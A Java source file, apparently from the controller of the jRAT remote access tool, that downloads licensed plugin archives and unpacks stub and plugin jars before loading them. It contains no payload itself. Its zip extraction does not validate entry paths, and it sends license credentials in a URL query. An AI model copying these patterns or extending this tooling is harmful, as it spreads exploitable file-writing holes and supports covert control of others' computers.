package io.jrat.controller.addons;

import io.jrat.common.Logger;
import io.jrat.common.listeners.CopyStreamsListener;
import io.jrat.common.utils.DataUnits;
import io.jrat.common.utils.IOUtils;
import io.jrat.controller.Constants;
import io.jrat.controller.Globals;
import io.jrat.controller.Main;
import io.jrat.controller.License;
import io.jrat.controller.listeners.ExtensionInstallerListener;
import io.jrat.controller.net.WebRequest;
import java.awt.Color;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.security.InvalidKeyException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;


public class PluginInstaller {

	private OnlinePlugin plugin;
	private ExtensionInstallerListener listener;

	public PluginInstaller(OnlinePlugin plugin, ExtensionInstallerListener listener) {
		this.plugin = plugin;
		this.listener = listener;
	}

	public void toggle() throws Exception {
		if (plugin.isInstalled()) {
			uninstall();
		} else {
			install();
		}
	}

	public void uninstall() throws Exception {
		Logger.log("Deleting " + plugin.getJar().getAbsolutePath() + ": " + (plugin.getJar().delete()));
		Logger.log("Deleting " + plugin.getDirectory().getAbsolutePath() + ": " + (plugin.getDirectory().delete()));
		
		for (File file : plugin.getStubs()) {
			Logger.log("Deleting " + file.getAbsolutePath() + ": " + (file.delete()));
		}
	}

	public void install() throws Exception {
		listener.status(Color.black, "Connecting...", 0, 100);

		File temp = File.createTempFile(plugin.getName() + "_temp_download", ".zip");

		Map<String, String> license = License.getLicense();
		String key = license.get("key");
		String mail = license.get("mail");

		HttpURLConnection archiveConnection = (HttpURLConnection) WebRequest.getConnection(Constants.HOST + "/plugins/getplugin.php?plugin=" + plugin.getName().replace(" ", "") + "&k=" + key + "&m=" + mail);
		archiveConnection.setReadTimeout(15000);
		archiveConnection.connect();

		int response = archiveConnection.getResponseCode();
		
		if (response == 400) {
			throw new MalformedURLException("Failed to send correct request");
		} else if (response == 404) {
			throw new FileNotFoundException("Failed to find plugin package: " + plugin.getName());
		} else if (response == 401) {
			throw new InvalidKeyException("Key not found, not valid license?");
		}

		InputStream in = archiveConnection.getInputStream();

		final int length = archiveConnection.getContentLength();

		Logger.log(length);

		FileOutputStream out = new FileOutputStream(temp);

		IOUtils.copy(length, in, out, new CopyStreamsListener() {
			@Override
			public void chunk(long current, long total, int percent) {
				String c = DataUnits.getAsString(current);
				String t = DataUnits.getAsString(total);
				if (length == -1) {
					listener.status(Color.black, "Downloaded " + c, (int) current, (int) total);
				} else {
					listener.status(Color.black, "Downloaded " + c + "/" + t, (int) current, (int) total);
				}
			}
		});

		out.close();
		in.close();
		
		archiveConnection.disconnect();

		ZipFile zip = new ZipFile(temp);
		Enumeration<? extends ZipEntry> entriesEnum = zip.entries();
		List<ZipEntry> entries = new ArrayList<ZipEntry>();

		while (entriesEnum.hasMoreElements()) {
			entries.add(entriesEnum.nextElement());
		}

		List<File> mainJars = new ArrayList<File>();

		for (int i = 0; i < entries.size(); i++) {
			ZipEntry entry = entries.get(i);

			File output;

			if (entry.getName().startsWith("stubs/") && entry.getName().toLowerCase().endsWith(".jar")) {
				output = new File(Globals.getPluginStubDirectory(), plugin.getName() + " " + entry.getName().substring("stubs/".length(), entry.getName().length()));
			} else if (entry.getName().startsWith("root/")) {
				output = new File(Globals.getPluginDirectory(), entry.getName().substring("root/".length(), entry.getName().length()));
				if (!entry.getName().equals("root/")) {
					mainJars.add(output);
				}
			} else {
				output = new File(Globals.getPluginDirectory(), plugin.getName() + "/" + entry.getName());
			}

			if (output.isDirectory()) {
				continue;
			}

			if (output.getParentFile() != null && !output.getParentFile().exists()) {
				output.getParentFile().mkdirs();
			}

			output.createNewFile();

			listener.status(Color.black, "Writing " + output.getName(), i, entries.size());

			InputStream entryIs = zip.getInputStream(entry);
			FileOutputStream entryOut = new FileOutputStream(output);

			IOUtils.copy(entryIs, entryOut);

			entryIs.close();
			entryOut.close();
		}

		zip.close();

		temp.delete();

		for (File file : mainJars) {
			try {
				Plugins.getLoader().load(file);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		Main.instance.reloadPlugins();
	}

}
